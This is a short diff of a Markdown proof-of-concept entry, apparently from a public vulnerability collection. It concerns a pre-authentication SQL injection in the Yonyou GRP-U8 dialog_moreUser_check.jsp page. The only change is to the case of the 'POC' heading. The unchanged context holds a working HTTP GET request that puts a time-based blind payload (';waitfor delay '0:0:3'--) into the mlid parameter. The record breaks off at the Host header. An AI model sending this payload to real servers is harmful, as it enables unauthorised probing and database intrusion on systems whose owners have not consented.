@@ -1,6 +1,6 @@
 ## 用友GRP-U8-dialog_moreUser_check.jsp前台SQL注入
 
-## poc
+## POC
 ```
 GET /u8qx/dialog_moreUser_check.jsp?mlid=';waitfor+delay+'0:0:3'-- HTTP/1.1
 Host: 
